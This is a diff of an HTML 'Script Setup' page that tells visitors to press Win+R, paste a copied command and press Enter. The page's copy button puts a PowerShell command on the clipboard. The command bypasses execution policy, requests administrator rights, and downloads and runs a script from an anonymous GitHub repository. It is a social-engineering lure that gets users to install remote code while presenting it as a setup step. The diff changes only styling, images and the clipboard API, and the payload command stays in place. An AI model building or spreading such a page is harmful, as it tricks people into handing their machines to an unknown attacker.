@@ -2,16 +2,16 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Start Command Launcher</title>
+    <title>Script Setup</title>
     <style>
         body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: white; display: flex; justify-content: center; padding: 40px 0; margin: 0; }
         .container { background: #161b22; padding: 30px; border-radius: 12px; border: 1px solid #30363d; text-align: center; max-width: 600px; width: 90%; }
-        .btn { background: #238636; color: white; padding: 20px 40px; font-size: 22px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.2s; }
-        .btn:hover { background: #2ea44f; transform: scale(1.02); }
-        .step-box { margin-top: 30px; text-align: left; background: #0d1117; padding: 20px; border-radius: 8px; border: 1px solid #30363d; }
-        .step-title { color: #58a6ff; font-weight: bold; font-size: 18px; margin-bottom: 10px; display: block; }
-        img { width: 100%; max-width: 450px; border-radius: 8px; margin: 15px 0; border: 1px solid #444; }
-        kbd { background: #30363d; padding: 3px 6px; border-radius: 4px; font-family: monospace; color: white; }
+        .btn { background: #238636; color: white; padding: 20px 40px; font-size: 22px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.2s; margin-bottom: 20px;}
+        .btn:hover { background: #2ea44f; }
+        .step-box { margin-top: 20px; text-align: left; background: #0d1117; padding: 20px; border-radius: 8px; border: 1px solid #30363d; }
+        .step-title { color: #58a6ff; font-weight: bold; font-size: 18px; display: block; margin-bottom: 10px; }
+        img { width: 100%; border-radius: 8px; margin-top: 15px; border: 1px solid #30363d; }
+        kbd { background: #30363d; padding: 2px 5px; border-radius: 4px; font-family: monospace; }
     </style>
 </head>
 <body>
@@ -25,29 +25,22 @@
     <div class="step-box">
         <span class="step-title">Step 1: Open Run Box</span>
         <p>Press <kbd>Win</kbd> + <kbd>R</kbd> on your keyboard at the same time.</p>
-        <img src="https://www.wikihow.com/images/thumb/7/7e/Open-the-Run-Command-on-Windows-10-Step-1-Version-3.jpg/v4-728px-Open-the-Run-Command-on-Windows-10-Step-1-Version-3.jpg" alt="Keyboard Shortcut">
+        <img src="keyboard.png" alt="Keyboard Shortcut">
     </div>
 
     <div class="step-box">
         <span class="step-title">Step 2: Paste and Run</span>
         <p>Right-click in the box, select <b>Paste</b>, and press <b>Enter</b>.</p>
-        <img src="https://www.lifewire.com/thmb/x2N8T6h2_Gv8xL-t2E-Hl_X-v-g=/1500x0/filters:no_upscale():max_bytes(150000):strip_icc()/run-command-windows-10-5ba2d7c046e0fb00259e83e2.png" alt="Run Window">
+        <img src="runbox.png" alt="Run Window">
     </div>
 </div>
 
 <script>
 function copyCmd() {
     const command = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command IEX (iwr -UseBasicParsing https://github.com/zrxqzrxq123/asdasdc1/raw/refs/heads/main/Start.ps1)' -Verb RunAs\"";
-    
-    // Copy to clipboard
-    const el = document.createElement('textarea');
-    el.value = command;
-    document.body.appendChild(el);
-    el.select();
-    document.execCommand('copy');
-    document.body.removeChild(el);
-
-    alert("Command Copied! Now press Win+R to paste.");
+    navigator.clipboard.writeText(command).then(() => {
+        alert("Command Copied! Now press Win+R.");
+    });
 }
 </script>
 
